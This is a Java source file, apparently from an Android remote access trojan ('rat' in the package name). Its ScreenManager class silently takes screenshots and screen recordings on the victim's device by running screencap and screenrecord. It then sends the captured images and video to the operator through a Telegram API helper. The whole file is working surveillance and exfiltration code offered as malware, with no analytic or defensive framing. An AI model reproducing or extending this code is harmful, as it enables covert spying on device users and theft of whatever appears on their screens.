package com.enterprise.rat.commands;

import android.content.Context;
import android.os.Environment;
import com.enterprise.rat.utils.TelegramApi;
import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class ScreenManager {
    private Context context;

    public ScreenManager(Context context) { this.context = context; }

    public void takeScreenshot() {
        try {
            String name = "SCR_" + new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(new Date()) + ".png";
            File out = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES), name);
            Process p = Runtime.getRuntime().exec("screencap -p " + out.getAbsolutePath());
            p.waitFor();
            if (out.exists() && out.length() > 0) {
                TelegramApi.sendPhoto(out, "📸 Screenshot");
            } else TelegramApi.sendMessage("❌ Screenshot failed");
        } catch (Exception e) { TelegramApi.sendMessage("❌ " + e.getMessage()); }
    }

    public void startScreenRecord(int seconds) {
        try {
            String name = "VID_" + new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(new Date()) + ".mp4";
            File out = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MOVIES), name);
            Process p = Runtime.getRuntime().exec("screenrecord --time-limit " + seconds + " " + out.getAbsolutePath());
            new Thread(() -> {
                try { p.waitFor(); Thread.sleep(1500);
                    if (out.exists()) TelegramApi.sendFile(out, "📹 Screen Recording " + seconds + "s");
                } catch (Exception e) {}
            }).start();
            TelegramApi.sendMessage("📹 Recording " + seconds + "s...");
        } catch (Exception e) { TelegramApi.sendMessage("❌ " + e.getMessage()); }
    }
}
